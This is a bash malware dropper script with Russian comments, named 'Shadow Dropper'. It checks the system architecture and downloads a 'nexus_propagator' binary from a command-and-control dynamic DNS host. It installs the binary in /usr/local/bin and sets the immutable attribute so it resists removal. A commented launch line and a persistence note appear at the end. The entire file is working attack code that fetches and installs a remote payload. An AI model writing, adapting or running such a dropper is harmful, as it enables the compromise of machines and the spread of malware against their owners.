#!/bin/bash

C2_IP="angel0chek.duckdns.org" # Заменить на реальный IP C2
NEXUS_BIN_NAME="nexus_propagator"
INSTALL_PATH="/usr/local/bin/$NEXUS_BIN_NAME"
TEMP_DIR="/tmp"

echo "Starting Shadow Dropper..."

# 1. Проверка архитектуры системы
ARCH=$(uname -m)
DOWNLOAD_URL=""

case "$ARCH" in
    "x86_64")
        echo "Detected x86_64 architecture."
        DOWNLOAD_URL="http://${C2_IP}/binaries/x86_64/${NEXUS_BIN_NAME}"
        ;;
    "aarch64")
        echo "Detected ARM64 architecture."
        DOWNLOAD_URL="http://${C2_IP}/binaries/aarch64/${NEXUS_BIN_NAME}"
        ;;
    *)
        echo "Unsupported architecture: $ARCH. Exiting."
        exit 1
        ;;
esac

# 2. Скачивание соответствующего бинарника nexus_propagator
echo "Downloading Nexus Propagator from ${DOWNLOAD_URL}..."
if ! curl -sL "${DOWNLOAD_URL}" -o "${TEMP_DIR}/${NEXUS_BIN_NAME}"; then
    echo "Failed to download Nexus Propagator. Exiting."
    exit 1
fi
echo "Download complete."

# 3. Установка прав на исполнение
chmod +x "${TEMP_DIR}/${NEXUS_BIN_NAME}"
echo "Set execute permissions for ${TEMP_DIR}/${NEXUS_BIN_NAME}."

# 4. Перемещение в постоянное место
if ! mv "${TEMP_DIR}/${NEXUS_BIN_NAME}" "${INSTALL_PATH}"; then
    echo "Failed to move Nexus Propagator to ${INSTALL_PATH}. Exiting."
    exit 1
fi
echo "Nexus Propagator installed to ${INSTALL_PATH}."

# 5. Установка атрибута chattr +i
echo "Setting immutable attribute for ${INSTALL_PATH}..."
if ! chattr +i "${INSTALL_PATH}"; then
    echo "WARNING: Failed to set immutable attribute for ${INSTALL_PATH}. This might require root privileges or specific filesystem support."
else
    echo "Immutable attribute set for ${INSTALL_PATH}."
fi

echo "Shadow Dropper finished."

# Запуск Nexus Propagator (опционально, можно добавить логику для персистентности)
# nohup "${INSTALL_PATH}" &